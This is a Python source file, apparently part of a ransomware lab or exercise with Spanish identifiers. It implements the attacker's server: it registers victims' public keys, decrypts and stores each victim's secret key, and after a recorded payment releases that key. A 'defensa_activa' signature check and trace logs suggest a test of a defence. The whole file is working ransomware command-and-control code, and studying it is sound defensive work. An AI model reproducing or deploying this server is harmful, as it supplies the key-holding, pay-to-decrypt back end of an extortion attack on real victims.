import socket
from pathlib import Path

from Crypto.PublicKey import RSA

from protocolo.firmas import (
    FirmaInvalida,
    ROL_S,
    ROL_V,
    defensa_activa,
    firmar,
    verificar,
)
from protocolo.mensajes import (
    PUERTO,
    TIPO_CONFIRMACION,
    TIPO_ENTREGA,
    TIPO_ERROR,
    TIPO_REGISTRO,
    TIPO_RESPUESTA,
    TIPO_PAGO,
    TIPO_SOLICITUD,
    emitir,
    leer,
)
from protocolo.oaep import abrir
from protocolo.registro import desempaquetar, empaquetar
from servidor.claves import asegurar, par_cargado, privada
from servidor.registro import anotar_victima, guardados, guardar, incorporar,leer_sv_pagado, marcar_pagado

TRAZA = Path("/datos/traza-servidor/entrega")
TRAZA_REGISTRO = Path("/datos/traza-servidor/registro")
TRAZA_PAGO = Path("/datos/traza-servidor/pago")
REINICIO = Path("/datos/traza-servidor/reinicio")

CIERRE = Path("/datos/control/cerrar")
CONFIANZA = Path("/datos/confianza")


def _trazar(id_v, resultado, detalle):
    TRAZA.parent.mkdir(parents=True, exist_ok=True)
    with TRAZA.open("a", encoding="utf-8") as salida:
        salida.write(f"entrega {id_v.hex()} {resultado} {detalle}\n")

def _trazar_pago(id_v, resultado, detalle):
    TRAZA_PAGO.parent.mkdir(parents=True, exist_ok=True)
    with TRAZA_PAGO.open("a", encoding="utf-8") as salida:
        salida.write(f"pago {id_v.hex()} {resultado} {detalle}\n")

def _trazar_registro(id_v, detalle):
    TRAZA_REGISTRO.parent.mkdir(parents=True, exist_ok=True)
    with TRAZA_REGISTRO.open("a", encoding="utf-8") as salida:
        salida.write(f"registro {id_v.hex()} ok {detalle}\n")


def _trazar_rechazo(id_v, motivo):
    TRAZA_REGISTRO.parent.mkdir(parents=True, exist_ok=True)
    with TRAZA_REGISTRO.open("a", encoding="utf-8") as salida:
        salida.write(f"registro {id_v.hex()} error {motivo}\n")


def atender(conexion):
    with conexion:
        tipo, cuerpo = leer(conexion)
        if tipo == TIPO_REGISTRO:
            id_v, pk_v, firma_v = desempaquetar(cuerpo)
            clave = RSA.import_key(pk_v)
            if clave.has_private() or clave.e != 65537 or clave.n.bit_length() != 2048:
                raise ValueError("pkV")
            if defensa_activa():
                try:
                    verificar(
                        CONFIANZA / "verificacion_victima.pem",
                        ROL_V,
                        id_v,
                        pk_v,
                        firma_v,
                    )
                except FirmaInvalida:
                    _trazar_rechazo(id_v, "firma-victima")
                    return
            nueva = anotar_victima(id_v, pk_v)
            pk_s = par_cargado().publickey().export_key(format="DER", pkcs=8)
            firma_s = firmar(CONFIANZA / "propia.pem", ROL_S, id_v, pk_s)
            _trazar_registro(id_v, "asociada" if nueva else "misma")
            conexion.sendall(emitir(TIPO_RESPUESTA, empaquetar(id_v, pk_s, firma_s)))
            return
        
        if tipo == TIPO_SOLICITUD and len(cuerpo) == 16:
            id_v = cuerpo
            try:
                sv, pk_v_der = leer_sv_pagado(id_v)
            except LookupError:
                _trazar_pago(id_v, "error", "sin-sv")
                conexion.sendall(emitir(TIPO_ERROR, id_v + b"sin-sv"))
                return
            try:
                cifrado = abrir(RSA.import_key(pk_v_der)).encrypt(sv)
            except (ValueError, LookupError):
                _trazar_pago(id_v, "error", "pkV")
                conexion.sendall(emitir(TIPO_ERROR, id_v + b"pkV"))
                return
            marcar_pagado(id_v)
            _trazar_pago(id_v, "ok", "pagado")
            conexion.sendall(emitir(TIPO_PAGO, id_v + cifrado))
            return
        if tipo != TIPO_ENTREGA or len(cuerpo) < 16:
            return
        id_v, cifrado = cuerpo[:16], cuerpo[16:]
        incorporar()
        try:
            sv = abrir(privada()).decrypt(cifrado)
            guardar(id_v, sv)
        except (ValueError, LookupError):
            _trazar(id_v, "error", "no-abre")
            conexion.sendall(emitir(TIPO_ERROR, id_v + b"no-abre"))
            return
        _trazar(id_v, "ok", "confirmada")
        conexion.sendall(emitir(TIPO_CONFIRMACION, id_v))


def anunciar():
    par_cargado()
    REINICIO.parent.mkdir(parents=True, exist_ok=True)
    with REINICIO.open("a", encoding="utf-8") as salida:
        for id_v, pago in guardados():
            salida.write(f"reinicio {id_v.hex()} ok {pago}\n")


def main():
    asegurar()
    anunciar()
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind(("0.0.0.0", PUERTO))
    servidor.settimeout(0.3)
    servidor.listen()
    while True:
        if CIERRE.is_file():
            CIERRE.unlink()
            return
        try:
            conexion, _ = servidor.accept()
        except socket.timeout:
            continue
        try:
            atender(conexion)
        except Exception:
            continue


if __name__ == "__main__":
    main()
    

